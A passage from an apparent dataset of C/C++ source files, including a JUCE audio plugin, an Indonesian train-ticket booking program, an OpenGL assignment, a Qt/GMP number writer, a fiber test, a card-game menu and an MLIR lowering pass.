archive(fm);\n    }\n    std::ofstream decomp_file(seq_file.substr(0, seq_file.find('.')) +\n                              \"_decompressed.fa\");\n    if (!decomp_file) {\n        throw std::runtime_error(\"Failed to open decompressed.fa for writing\");\n    }\n\n    for (const auto& p : compressed) {\n        for (size_t i = 0; i < p.second; ++i) {\n            decomp_file << seqan3::to_char(ref_vec[p.first + i]);\n        }\n    }\n}\n",
    "/*\n  ==============================================================================\n\n    This file contains the basic framework code for a JUCE plugin processor.\n\n  ==============================================================================\n*/\n\n#include \"PluginProcessor.h\"\n#include \"PluginEditor.h\"\n\n//==============================================================================\nEQtutAudioProcessor::EQtutAudioProcessor()\n#ifndef JucePlugin_PreferredChannelConfigurations\n     : AudioProcessor (BusesProperties()\n                     #if ! JucePlugin_IsMidiEffect\n                      #if ! JucePlugin_IsSynth\n                       .withInput  (\"Input\",  juce::AudioChannelSet::stereo(), true)\n                      #endif\n                       .withOutput (\"Output\", juce::AudioChannelSet::stereo(), true)\n                     #endif\n                       )\n#endif\n{\n}\n\nEQtutAudioProcessor::~EQtutAudioProcessor()\n{\n}\n\n//==============================================================================\nconst juce::String EQtutAudioProcessor::getName() const\n{\n    return JucePlugin_Name;\n}\n\nbool EQtutAudioProcessor::acceptsMidi() const\n{\n   #if JucePlugin_WantsMidiInput\n    return true;\n   #else\n    return false;\n   #endif\n}\n\nbool EQtutAudioProcessor::producesMidi() const\n{\n   #if JucePlugin_ProducesMidiOutput\n    return true;\n   #else\n    return false;\n   #endif\n}\n\nbool EQtutAudioProcessor::isMidiEffect() const\n{\n   #if JucePlugin_IsMidiEffect\n    return true;\n   #else\n    return false;\n   #endif\n}\n\ndouble EQtutAudioProcessor::getTailLengthSeconds() const\n{\n    return 0.0;\n}\n\nint EQtutAudioProcessor::getNumPrograms()\n{\n    return 1;   // NB: some hosts don't cope very well if you tell them there are 0 programs,\n                // so this should be at least 1, even if you're not really implementing programs.\n}\n\nint EQtutAudioProcessor::getCurrentProgram()\n{\n    return 0;\n}\n\nvoid EQtutAudioProcessor::setCurrentProgram (int index)\n{\n}\n\nconst juce::String EQtutAudioProcessor::getProgramName (int index)\n{\n    return {};\n}\n\nvoid EQtutAudioProcessor::changeProgramName (int index, const juce::String& newName)\n{\n}\n\n//==============================================================================\nvoid EQtutAudioProcessor::prepareToPlay (double sampleRate, int samplesPerBlock)\n{\n    // Use this method as the place to do any pre-playback\n    // initialisation that you need..\n\n    // spec prepares filters before we use them\n    juce::dsp::ProcessSpec spec;\n    spec.maximumBlockSize = samplesPerBlock;\n    spec.numChannels = 1;\n    spec.sampleRate = sampleRate;\n\n    // pass spec to left and right channel chains\n    leftChain.prepare(spec);\n    rightChain.prepare(spec);\n\n    updateFilters();\n\n    leftChannelFifo.prepare(samplesPerBlock);\n    rightChannelFifo.prepare(samplesPerBlock);\n}\n\nvoid EQtutAudioProcessor::releaseResources()\n{\n    // When playback stops, you can use this as an opportunity to free up any\n    // spare memory, etc.\n}\n\n#ifndef JucePlugin_PreferredChannelConfigurations\nbool EQtutAudioProcessor::isBusesLayoutSupported (const BusesLayout& layouts) const\n{\n  #if JucePlugin_IsMidiEffect\n    juce::ignoreUnused (layouts);\n    return true;\n  #else\n    // This is the place where you check if the layout is supported.\n    // In this template code we only support mono or stereo.\n    // Some plugin hosts, such as certain GarageBand versions, will only\n    // load plugins that support stereo bus layouts.\n    if (layouts.getMainOutputChannelSet() != juce::AudioChannelSet::mono()\n     && layouts.getMainOutputChannelSet() != juce::AudioChannelSet::stereo())\n        return false;\n\n    // This checks if the input layout matches the output layout\n   #if ! JucePlugin_IsSynth\n    if (layouts.getMainOutputChannelSet() != layouts.getMainInputChannelSet())\n        return false;\n   #endif\n\n    return true;\n  #endif\n}\n#endif\n\nvoid EQtutAudioProcessor::processBlock (juce::AudioBuffer<float>& buffer, juce::MidiBuffer& midiMessages)\n{\n    juce::ScopedNoDenormals noDenormals;\n    auto totalNumInputChannels  = getTotalNumInputChannels();\n    auto totalNumOutputChannels = getTotalNumOutputChannels();\n\n    // In case we have more outputs than inputs, this code clears any output\n    // channels that didn't contain input data, (because these aren't\n    // guaranteed to be empty - they may contain garbage).\n    // This is here to avoid people getting screaming feedback\n    // when they first compile a plugin, but obviously you don't need to keep\n    // this code if your algorithm always overwrites all the output channels.\n    for (auto i = totalNumInputChannels; i < totalNumOutputChannels; ++i)\n        buffer.clear (i, 0, buffer.getNumSamples());\n\n    updateFilters();\n\n    // -- PROCESS --\n    juce::dsp::AudioBlock<float> block(buffer);\n    auto leftBlock = block.getSingleChannelBlock(0);\n    auto rightBlock = block.getSingleChannelBlock(1);\n\n    juce::dsp::ProcessContextReplacing<float> leftContext(leftBlock);\n    juce::dsp::ProcessContextReplacin",
    "#include<stdio.h>\r\n#include<string.h>\r\n#include<stdlib.h>\r\n#include<time.h>\r\n#include<conio.h>\r\n\r\nvoid inputPassword(char *password) {\r\n    int i = 0;\r\n    char ch;\r\n    while (1) {\r\n        ch = getch(); //membuat karakter huruf yang ditampilkan menjadi tidak terlihat \r\n        if(ch == '\\n' || ch == '\\r') { //jika menekan enter, maka looping akan berhenti\r\n            printf(\"\\n\"); //memindahkan kebaris baru jika input sudah selesai\r\n            break;\r\n        } else if(ch == '\\b' && i > 0) { //untuk membuat backspace berfungsi\r\n            printf(\"\\b \\b\"); //menghapus karakter terakhir dari console\r\n            i--;\r\n        } else if (ch != '\\b') {\r\n            password[i++] = ch;\r\n            printf(\"*\"); //menampilkan '*' untuk setiap karakter yang diinput\r\n        }     \r\n    }\r\n    password[i] = '\\0'; //mengakhiri string dengan null character\r\n}\r\nint main() {\r\n    int harga, noPerjalanan, totalHarga, jumlahTiket, kelasPerjalanan, angka1, angka2, jwb, diskon, subtotal;\r\n    int percobaan = 0;\r\n    bool loginBerhasil = false;\r\n    char namaPelanggan[30], perjalanan[30], username[50], password[50], voucher[30], konfirmasi;\r\n    char usenameBenar[] = \"annisarasha24\";\r\n    char passwordBenar[] = \"1a2b3c4d\";\r\n    char kodeVoucher[] = \"LiburanHappy\";\r\n\r\n    srand(time(NULL)); //untuk menginisialisasi random seed\r\n\r\n    while (percobaan < 3) {\r\n        printf(\"Username: \");\r\n        fgets(username, 50, stdin);\r\n        username[strcspn(username, \"\\n\")] = 0; //menghapus new line\r\n\r\n        printf(\"Password: \");\r\n        inputPassword(password);\r\n\r\n        if(percobaan < 2) {\r\n            angka1 = rand() % 10;\r\n            angka2 = rand() % 10;\r\n            printf(\"Jumlah dari %d + %d adalah: \", angka1, angka2);\r\n            scanf(\"%d\", &jwb);\r\n            getchar(); //membersihkan buffer setelah scanf\r\n\r\n            if (jwb != angka1 + angka2) {\r\n                printf(\"Captcha salah, silakan coba lagi\\n\");\r\n                continue;\r\n            } \r\n        }\r\n\r\n        if(strcmp(username, usenameBenar) == 0 && strcmp(password, passwordBenar) == 0) {\r\n            printf(\"\\tLOGIN BERHASIL\\n\\n\");\r\n            loginBerhasil = true;\r\n            break;\r\n        } else if(strcmp(username, usenameBenar) == 0) {\r\n            printf(\"Password yang anda masukkan salah, silakan coba lagi.\\n\");\r\n            percobaan++;\r\n            if (percobaan == 3) {\r\n                printf(\"Anda telah mencoba 3x. Coba lagi nanti.\\n\");\r\n            }\r\n        } else if(strcmp(password, passwordBenar) == 0) {\r\n            printf(\"Username yang anda masukkan salah, silakan coba lagi.\\n\");\r\n            percobaan++;\r\n            if (percobaan == 3) {\r\n                printf(\"Anda telah mencoba 3x. Coba lagi nanti.\\n\");\r\n            }\r\n        } else {\r\n            printf(\"Username dan Password yang anda masukkan salah, silakan coba lagi.\\n\");\r\n            percobaan++;\r\n            if (percobaan == 3) {\r\n                printf(\"Anda telah mencoba 3x. Coba lagi nanti.\\n\");\r\n            }\r\n        }\r\n    }\r\n\r\n    if (!loginBerhasil) {\r\n        return 0;\r\n    }\r\n\r\n    printf(\"PEMESANAN TIKET KERETA API ONLINE\\n\");\r\n\r\n    \r\n    printf(\"\\n    Menu Perjalanan    \\n\");\r\n    printf(\"=======================\\n\");\r\n    printf(\"1. Bandung - Yogyakarta\\n\");\r\n    printf(\"2. Bandung - Malang\\n\");\r\n    printf(\"3. Bandung - Jakarta\\n\");\r\n    printf(\"4. Bandung - Surabaya\\n\");\r\n    printf(\"5. Bandung - Semarang\\n\");\r\n    printf(\"6. Bandung - Brebes\\n\");\r\n    printf(\"7. Bandung - Tegal\\n\");\r\n    printf(\"\\nMasukkan kode voucher 'LiburanHappy' untuk mendapatkan potongan harga\\n\");\r\n\r\n    do {\r\n        printf(\"\\nPilih nomor perjalanan : \");\r\n        scanf(\"%d\", &noPerjalanan);\r\n\r\n       if(noPerjalanan == 1) {\r\n            strcpy(perjalanan, \"Bandung - Yogyakarta\");\r\n            printf(\"\\n       Kelas Perjalanan       \\n\");\r\n            printf(\"==============================\\n\");\r\n            printf(\"1. Ekonomi Premium  : Rp220000\\n\");\r\n            printf(\"2. Eksekutif        : Rp400000\\n\");\r\n            printf(\"\\nPilih kelas perjalanan (1/2): \");\r\n            scanf(\"%d\", &kelasPerjalanan);\r\n            if (kelasPerjalanan == 1) {\r\n                harga = 220000;\r\n            } else if (kelasPerjalanan == 2) {\r\n                harga = 400000;\r\n            } else {\r\n                printf(\"Nomor yang anda masukkan tidak valid\");\r\n            }      \r\n        } else if (noPerjalanan == 2) {\r\n            strcpy(perjalanan, \"Bandung - Malang\");\r\n            printf(\"\\n       Kelas Perjalanan       \\n\");\r\n            printf(\"==============================\\n\");\r\n            printf(\"1. Ekonomi Premium  : Rp260000\\n\");\r\n            printf(\"2. Eksekutif        : Rp480000\\n\");\r\n            printf(\"\\nPilih kelas perjalanan (1/2): \");\r\n            scanf(\"%d\", &kelasPerjalanan);\r\n            if (kelasPerjalanan == 1) {\r\n                harga = 260000;\r\n            } else if (kelasPerjalanan == 2) {\r\n                harga = 480000;\r\n            } else {\r\n                ",
    "#undef GLFW_DLL\r\n#include <iostream>\r\n#include <stdio.h>\r\n#include <string>\r\n#include <string.h>\r\n\r\n#include <GL/glew.h>\r\n#include <GLFW/glfw3.h>\r\n\r\n#include <vector>\r\n#include <cmath>\r\n\r\n#include \"Libs/Shader.h\"\r\n#include \"Libs/Window.h\"\r\n#include \"Libs/Mesh.h\"\r\n#include \"Libs/stb_image.h\"\r\n\r\n#include <glm/glm.hpp>\r\n#include <glm/gtc/matrix_transform.hpp>\r\n#include <glm/gtc/type_ptr.hpp>\r\n\r\nconst GLint WIDTH = 800, HEIGHT = 600;\r\n\r\nWindow mainWindow;\r\nstd::vector<Mesh *> meshList;\r\nstd::vector<Shader> shaderList;\r\n\r\n// Assignment 3\r\n// Tharita Watanapa \r\n// Pilada Prasan \r\n\r\n// Vertex Shader\r\nstatic const char *vShader = \"Shaders/shader.vert\";\r\n\r\n// Fragment Shader\r\nstatic const char *fShader = \"Shaders/shader.frag\";\r\n\r\nvoid CreateTriangle()\r\n{\r\n    GLfloat vertices_mount_mid[] =\r\n        {\r\n            -1.0f, -1.0f, 0.3f, 0.0f, 0.0f, // 0\r\n            -0.3f, -1.0f, 1.0f, 0.5f, 0.0f, // 1\r\n            1.3f, -1.0f, 0.3f, 1.0f, 0.0f,  // 2\r\n            0.0f, 1.3f, 0.0f, 0.5f, 1.0f    // 3\r\n        };\r\n    unsigned int indices_mount_mid[] =\r\n        {\r\n            0, 3, 1,\r\n            1, 3, 2,\r\n            2, 3, 0,\r\n            0, 1, 2};\r\n\r\n    // Snowball-----------------------------------------\r\n    GLfloat vertices_Snowball[] =\r\n        {\r\n            -0.8f, -1.0f, -0.54f, 0.0f, 0.0f, // 0\r\n            -0.5f, -1.0f, 1.54f, 1.0f, 0.0f,  // 1\r\n            0.8f, -1.0f, -0.54f, 1.0f, 1.0f,  // 2\r\n            0.8f, -1.0f, 1.54f, 0.0f, 1.5f,   // 3\r\n            -0.4f, 1.5f, 1.0f, 0.7f, 0.0f,    // 4\r\n            0.5f, 1.5f, 1.0f, 1.3f, 0.2f,     // 5\r\n            -0.4f, 1.5f, 0.0f, 0.4f, 0.5f,    // 6\r\n            0.5f, 1.5f, 0.0f, 0.0f, 0.0f      // 7\r\n        };\r\n    unsigned int indices_Snowball[] =\r\n        {\r\n            0, 6, 1, // face 1\r\n            1, 6, 4, // face 2\r\n            4, 1, 3, // face 3\r\n            3, 4, 5,\r\n            5, 3, 2,\r\n            2, 5, 7,\r\n            7, 2, 6,\r\n            6, 2, 0 // face 4\r\n        };\r\n\r\n    // Cube ground\r\n    GLfloat vertices_Cube[] =\r\n        {\r\n            -1.0f, -1.0f, 0.0f, 1.0f, 1.2f,  // 0\r\n            1.0f, -1.0f, 1.0f, 0.5f, 1.1f,   // 1\r\n            1.0f, 1.0f, 1.0f, 1.5f, 0.5f,    // 2\r\n            -1.0f, 1.0f, 1.0f, 1.0f, 0.0f,   // 3\r\n            -1.0f, -1.0f, -1.0f, 0.5f, 1.3f, // 4\r\n            1.0f, -1.0f, -1.0f, 0.7f, 0.2f,  // 5\r\n            1.0f, 1.0f, -1.0f, 1.0f, 0.6f,   // 6\r\n            -1.0f, 1.0f, -1.0f, 0.0f, 1.0f   // 7\r\n        };\r\n\r\n    unsigned int indices_Cube[] =\r\n        {\r\n            3, 2, 0,\r\n            0, 2, 1,\r\n            1, 2, 6,\r\n            1, 6, 5,\r\n            5, 6, 4,\r\n            7, 4, 6,\r\n            7, 4, 3,\r\n            0, 3, 4,\r\n            7, 3, 6, // up_one\r\n            2, 6, 3  // up_two\r\n        };\r\n\r\n    // Moon\r\n    GLfloat vertices_Moon[] =\r\n        {\r\n            0.0f, 2.0f, 1.0f, 0.0f, 0.1f,   // 0\r\n            0.5f, 2.13f, 1.0f, 0.0f, 0.5f,  // 1\r\n            1.0f, 2.0f, 1.0f, 0.0f, 0.1f,   // 2\r\n            1.4f, 1.5f, 1.0f, 0.0f, 0.8f,   // 3\r\n            1.5f, 1.0f, 1.0f, 0.0f, 0.5f,   // 4\r\n            1.35f, 0.5f, 1.0f, 0.0f, 1.0f,  // 5\r\n            1.0f, 0.0f, 1.0f, 0.2f, 0.1f,   // 6\r\n            0.5f, 0.0f, 1.0f, 0.1f, 0.0f,   // 7\r\n            0.0f, 0.0f, 1.0f, 0.3f, 0.0f,   // 8\r\n            -0.36f, 0.5f, 1.0f, 0.1f, 0.5f, // 9\r\n            -0.5f, 1.0f, 1.0f, 0.4f, 0.0f,  // 10\r\n            -0.41f, 1.5f, 1.0f, 0.0f, 0.5f, // 11\r\n            0.5f, 1.0f, 1.5f, 1.0f, 0.2f    // 12 center\r\n        };\r\n\r\n    unsigned int indices_Moon[] =\r\n        {\r\n            0, 12, 11,\r\n            11, 12, 10,\r\n            10, 12, 9,\r\n            9, 12, 8,\r\n            8, 12, 7,\r\n            7, 12, 6,\r\n            6, 12, 5,\r\n            5, 12, 4,\r\n            4, 12, 3,\r\n            3, 12, 2,\r\n            2, 12, 1,\r\n            1, 12, 0\r\n\r\n        };\r\n\r\n    // Grass plant\r\n    GLfloat vertices_Grass[] =\r\n        {\r\n            0.0f, 0.0f, 1.0f, 0.5f, 1.0f,    // 0\r\n            0.0f, 1.0f, 1.0f, 0.3f, 1.0f,    // 1\r\n            -0.24f, 1.91f, 1.0f, 2.0f, 0.4f, // 2\r\n            -1.1f, 2.97f, 1.0f, 0.3f, 3.0f,  // 3\r\n            0.58f, 2.14f, 1.0f, 0.0f, 0.0f,  // 4\r\n            1.0f, 1.0f, 1.0f, 0.5f, 0.0f,    // 5\r\n            1.0f, 0.0f, 1.0f, 0.0f, 1.0f     // 7\r\n        };\r\n    unsigned int indices_Grass[] =\r\n        {4, 3, 2,\r\n         2, 4, 5,\r\n         5, 2, 1,\r\n         1, 0, 6,\r\n         6, 1, 5};\r\n\r\n    // Bird\r\n    GLfloat vertices_Bird[] =\r\n        {\r\n            -0.5f, 1.00f, 1.00f, 1.5f, 1.0f,  // 0\r\n            0.21f, 1.31f, 1.00f, 3.5f, 1.2f,  // 1\r\n            0.21f, 1.11f, 1.0f, 0.5f, 1.0f,   // 2\r\n            1.25f, 0.9f, 0.66f, 1.5f, 0.4f,   // 3\r\n            1.25f, 1.11f, 0.66f, 0.5f, 1.6f,  // 4\r\n            1.61f, 1.31f, 1.00f, 0.5f, 1.0f,  // 5\r\n            1.651f, 1.11f, 1.00f, 2.5f, 1.8f, // 6\r\n            2.50f, 1.00f, 1.00f, 0.5f, 2.0f   // 7\r\n        };\r\n    unsigned int indices_Bird[] =\r\n        {\r\n            1, 0, 2,\r\n            2, 1, 4,\r\n            4, 2, 3,\r\n            3, 6",
    "//#include <QCoreApplication>\n\n// int main(int argc, char *argv[])\n// {\n//     QCoreApplication a(argc, argv);\n\n//     return a.exec();\n// }\n//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////#include <QCoreApplication>\n\n#include <QCoreApplication>\n#include <QFile>\n#include <QDataStream>\n#include <QRandomGenerator>\n#include <gmpxx.h>\n#include <iostream>\n#include <limits>\n\nconst int NUMBER_COUNT = 205;\nconst QString FILE_NAME = \"/home/viktor/my_projects_qt_2/sgenerirovaty_neyroni_GMP/random_numbers.bin\";\n\nmpz_class generateRandomMPZ() {\n    quint64 randomValue = QRandomGenerator::global()->generate64();\n    qint64 signedRandomValue = static_cast<qint64>(randomValue);\n    return mpz_class(std::to_string(signedRandomValue));\n}\n//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\nvoid writeNumbersToFile(const QList<mpz_class>& numbers) { // \u044d\u0442\u043e\u0442 \u043d\u0430\u0434\u043e \u0437\u0430\u043c\u0435\u043d\u0438\u0442\u044c\n    QFile file(FILE_NAME);\n    if (!file.open(QIODevice::WriteOnly)) {\n        std::cerr << \"Failed to open file for writing\" << std::endl;\n        return;\n    }\n    QDataStream out(&file);\n    for (const auto& number : numbers) {\n        QByteArray byteArray = number.get_str().c_str();\n        out << byteArray;\n    }\n    file.close();\n}\n//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\nQList<mpz_class> readNumbersFromFile() {\n    QList<mpz_class> numbers;\n    QFile file(FILE_NAME);\n    if (!file.open(QIODevice::ReadOnly)) {\n        std::cerr << \"Failed to open file for reading\" << std::endl;\n        return numbers;\n    }\n    QDataStream in(&file);\n    while (!in.atEnd()) {\n        QByteArray byteArray;\n        in >> byteArray;\n        numbers.append(mpz_class(byteArray.constData()));\n    }\n    file.close();\n    return numbers;\n}\n\nint main(int argc, char *argv[]) {\n    QCoreApplication a(argc, argv);\n\n    QList<mpz_class> numbers;\n    for (int i = 0; i < NUMBER_COUNT; ++i) {\n        numbers.append(generateRandomMPZ());\n    }\n\n    writeNumbersToFile(numbers);\n\n    QList<mpz_class> readNumbers = readNumbersFromFile();\n    bool verificationSuccessful = (readNumbers == numbers);\n\n    if (verificationSuccessful) {\n        std::cout << \"Verification successful: numbers match\" << std::endl;\n    } else {\n        std::cout << \"Verification failed: numbers do not match\" << std::endl;\n    }\n\n    return a.exec();\n}\n",
    "/**\n * @file test_fiber.cpp\n * @brief \u534f\u7a0b1.0\u6d4b\u8bd5\u7248\u672c\n * @version 0.1\n * @date 2024-06-25\n */\n#include \"fiber.h\"\n#include \"log/log.h\"\n#include \"thread.h\"\n\n#include <vector>\n\nusing namespace std; \n\nstatic int m_close_log = 0;\n\nvoid run_in_fiber2() {\n    LOG_DEBUG(\"%s\", \"run_in_fiber2 begin\");\n    LOG_DEBUG(\"%s\", \"run_in_fiber2 end\");\n}\n\nvoid run_in_fiber() {\n    LOG_INFO(\"%s\", \"run_in_fiber begin\");\n\n    LOG_DEBUG(\"%s\", \"before run_in_fiber yield\");\n    Fiber::GetThis()->yield();\n    LOG_DEBUG(\"%s\", \"after run_in_fiber yield\");\n\n    LOG_INFO(\"%s\", \"run_in_fiber end\");\n}\n\nvoid test_fiber() {\n    LOG_INFO(\"%s\", \"test_fiber begin\");\n    \n    Fiber::GetThis(); //\u521d\u59cb\u5316\u7ebf\u7a0b\u4e3b\u534f\u7a0b \u8fd9\u91cc\u5f88\u91cd\u8981\n\n    Fiber::ptr fiber(new Fiber(run_in_fiber, 0)); //\u7ebf\u7a0b\u4e3b\u534f\u7a0b\uff0cstack_size\u5e94\u5f53\u4e3a0\n    LOG_DEBUG(\"user count is: %ld\", fiber.use_count()); //1\n\n    LOG_DEBUG(\"%s\", \"Before test_fiber resume\");\n    fiber->resume();\n    LOG_DEBUG(\"%s\", \"After test fiber resume\");\n\n    LOG_DEBUG(\"user count is: %ld\", fiber.use_count()); //3\n    LOG_DEBUG(\"fiber status: %d\", fiber->getState()); //READY\n\n    LOG_DEBUG(\"before test_fiber resume again\");\n    fiber->resume();\n    LOG_DEBUG(\"after test_fiber resume again\");\n\n    LOG_DEBUG(\"user count is: %ld\", fiber.use_count()); //1\n    LOG_DEBUG(\"fiber status: %d\", fiber->getState()); //TERM\n\n    fiber->reset(run_in_fiber2);\n    fiber->resume();\n\n    LOG_DEBUG(\"user count is: %ld\", fiber.use_count()); //1\n\n    LOG_INFO(\"%s\", \"test_fiber end\");\n}\n\n\n\nint main () {\n    Log::get_instance()->init(\"./ServerLog\", 0, 2000, 800000, 800);\n    LOG_INFO(\"%s\", \"TEST BEGIN\");\n\n    vector<Thread::ptr> thrs; //\u667a\u80fd\u6307\u9488\u6570\u7ec4\n    for (int i = 0; i < 2; ++i) {\n        thrs.push_back(Thread::ptr\n        (new Thread(&test_fiber, \"thread_\" + to_string(i))));\n    }\n\n    for (auto i : thrs) {\n        i->join();\n    }\n\n    LOG_INFO(\"%s\", \"TEST END\");\n    sleep(2);\n    return 0;\n}",
    "#include <iostream>\r\n#include \"declaraciones_funciones.h\"\r\n#include <cstdlib>\r\n\r\n\r\nusing namespace std;\r\n\r\nvoid MostraMenu (){\r\n\r\n    cout<< '\\t' << \"EMBAUCADO\" << endl;\r\n    cout<< \"-----------------------\" << endl;\r\n\r\n    cout<< \" Seleccione una opcion  :\"  << endl<< endl;\r\n    cout<<\"1-\"\"JUGAR\"<< endl;\r\n    cout<<\"2-\"\"ESTADISTICAS\"<< endl;\r\n    cout<<\"3-\"\"CREDITOS\"<<endl;\r\n    cout<<\"0-\"\"SALIR\"<<endl;\r\n\r\n}\r\n\r\nvoid SeleccionarOpcion(int &Opcion){\r\n cout <<\" \" ; cin>>Opcion;\r\n  switch(Opcion){\r\n        case 1:{\r\n            cout<< \" QUE COMIENCE EL JUEGO\"<< endl;\r\n            break;\r\n            }\r\n        case 2:{\r\n            cout<< \" ESTA EN LA ZONA DE ESTADISTICAS\"<< endl;\r\n            break;\r\n            }\r\n        case 3:{\r\n            cout<< \"ESTA EN LA ZONA DE CREDITOS \" << endl;\r\n            break;\r\n            }\r\n        case 0:\r\n            cout<< \"USTED ESTA SALIENDO DEL JUEGO \";\r\n            break;\r\n        }\r\n        system (\"cls\");\r\n}\r\n\r\nvoid DeclaracionDeNombres(string &Players1 , string &Players2){\r\n    char Continuar;\r\n    int Bandera = 1;\r\n\r\n        cout<< \"registrar sus nombres :\" << endl<< endl;\r\n    while(Bandera == 1){\r\n        cout<< \" ingrese nombre del jugardor 1 :\"<< \" \" ;\r\n        cin>> Players1;\r\n        cout<< \" ingrese nombre del jugador 2  :\"<< \" \" ;\r\n        cin>> Players2;\r\n        cout<<\"\u00bf desea confirmar los nombres ? (S/N):\"  ;\r\n        cin>>Continuar;\r\n        if(Continuar == 's'|| Continuar == 'S'){\r\n            Bandera = 0;\r\n        }else{\r\n            system(\"cls\");\r\n            cout<< \"Por favor. Vuelva a ingresar sus nombres \"<< endl << endl ;\r\n        }\r\n    }\r\n    system(\"cls\");\r\n}\r\n\r\nvoid CargarManoUno(int vec[],int Tam){\r\nstring Naipe,Palo;\r\nbool Repeat = true;\r\nwhile ( Repeat == true){\r\nRepeat = false;\r\n\r\nfor(int x=0; x<Tam;x++){\r\n    vec[x]= (rand ()% 20)+1;\r\n    }\r\n    HayRepetidos(vec,Tam);\r\n   cout << \" Mi primer vector cargado : \" << endl;\r\n    for(int x = 0;x<Tam ;x++){\r\n    cout << vec[x] << endl;\r\n    }\r\n}\r\n\r\n\r\n\r\n    //BuscarNaipe(vec,Tam,Naipe,Palo);\r\n}\r\n\r\nbool HayRepetidos(int vec[],int Tam){\r\nbool Repetido ;\r\n\r\n\r\n    for(int x=0;x<Tam;x++){\r\n        for(int i=0;i<Tam;i++){\r\n            if(vec[x] == vec[i+1]){\r\n\r\n            Repetido = true;\r\n            }\r\n        }\r\n\r\n    }\r\n    Repetido = false;\r\n\r\nreturn Repetido;\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n/*void BuscarNaipe(int Cod[], int Tam, string &Naipe, string &Palo){\r\n        for(int x=0;x<Tam;x++){\r\n\r\n        if(Cod[x]<5){\r\n            Palo= \"CORAZONES\";\r\n        }else if(Cod[x] <10){\r\n            Palo= \"DIAMANTES\";\r\n        }else if(Cod[x] <15){\r\n            Palo=\"PICAS\";\r\n        }else{\r\n            Palo=\"TREBOLES\";\r\n        }\r\n        if(Cod[x]==0 || Cod[x]== 5 || Cod[x]==10 || Cod[x]== 15){\r\n            Naipe = \"10\";\r\n        }\r\n        if(Cod[x]==1 || Cod[x]== 6 || Cod[x]==11 || Cod[x]== 16){\r\n            Naipe= \"J\";\r\n        }\r\n        if(Cod[x]==2|| Cod[x]== 7 || Cod[x]==12 || Cod[x]== 17){\r\n            Naipe=\"Q\";\r\n        }\r\n        if(Cod[x]==3 || Cod[x]== 8|| Cod[x]==13 || Cod[x]== 18){\r\n            Naipe=\"K\";\r\n        }\r\n        if(Cod[x]==4 || Cod[x]== 9 || Cod[x]==14 || Cod[x]== 19){\r\n            Naipe = \"A\";\r\n        }\r\n\r\n            cout<< '\\t' << '\\t' << Naipe << \" \" << Palo << endl;\r\n        }\r\n\r\n\r\n}*/\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n",
    "#include \"hecate/Conversion/EarthToCKKS/EarthToCKKS.h\"\n#include \"hecate/Conversion/CKKSCommon/PolyTypeConverter.h\"\n\n#include \"hecate/Dialect/CKKS/IR/CKKSOps.h\"\n#include \"hecate/Dialect/Earth/IR/EarthOps.h\"\n#include \"mlir/Conversion/ArithCommon/AttrToLLVMConverter.h\"\n#include \"mlir/Dialect/Tensor/IR/Tensor.h\"\n#include \"mlir/IR/TypeUtilities.h\"\n#include \"mlir/Pass/Pass.h\"\n#include \"mlir/Transforms/DialectConversion.h\"\n#include <type_traits>\n\nnamespace hecate {\n#define GEN_PASS_DEF_EARTHTOCKKSCONVERSION\n#include \"hecate/Conversion/Passes.h.inc\"\n} // namespace hecate\n\nusing namespace mlir;\nusing namespace hecate;\n\nnamespace {\n\n//===----------------------------------------------------------------------===//\n// Straightforward Op Lowerings\n//===----------------------------------------------------------------------===//\n\n//===----------------------------------------------------------------------===//\n// Op Lowering Patterns\n//===----------------------------------------------------------------------===//\n\n/// Directly lower to LLVM op.\nstruct ConstantOpLowering\n    : public OpConversionPattern<hecate::earth::ConstantOp> {\n  using OpConversionPattern<hecate::earth::ConstantOp>::ConversionPattern;\n  ConstantOpLowering(mlir::TypeConverter &converter, MLIRContext *ctxt,\n                     int64_t init_level)\n      : OpConversionPattern<hecate::earth::ConstantOp>(converter, ctxt),\n        init_level(init_level) {}\n\n  LogicalResult\n  matchAndRewrite(hecate::earth::ConstantOp op, OpAdaptor adaptor,\n                  ConversionPatternRewriter &rewriter) const override;\n  int64_t init_level;\n};\n\nstruct MulOpLowering : public OpConversionPattern<hecate::earth::MulOp> {\n  using OpConversionPattern<hecate::earth::MulOp>::ConversionPattern;\n  MulOpLowering(mlir::TypeConverter &converter, MLIRContext *ctxt)\n      : OpConversionPattern<hecate::earth::MulOp>(converter, ctxt) {}\n\n  LogicalResult\n  matchAndRewrite(hecate::earth::MulOp op, OpAdaptor adaptor,\n                  ConversionPatternRewriter &rewriter) const override;\n};\n\nstruct AddOpLowering : public OpConversionPattern<hecate::earth::AddOp> {\n  using OpConversionPattern<hecate::earth::AddOp>::ConversionPattern;\n  AddOpLowering(mlir::TypeConverter &converter, MLIRContext *ctxt)\n      : OpConversionPattern<hecate::earth::AddOp>(converter, ctxt) {}\n\n  LogicalResult\n  matchAndRewrite(hecate::earth::AddOp op, OpAdaptor adaptor,\n                  ConversionPatternRewriter &rewriter) const override;\n};\n\nstruct NegateOpLowering : public OpConversionPattern<hecate::earth::NegateOp> {\n  using OpConversionPattern<hecate::earth::NegateOp>::ConversionPattern;\n  NegateOpLowering(mlir::TypeConverter &converter, MLIRContext *ctxt)\n      : OpConversionPattern<hecate::earth::NegateOp>(converter, ctxt) {}\n\n  LogicalResult\n  matchAndRewrite(hecate::earth::NegateOp op, OpAdaptor 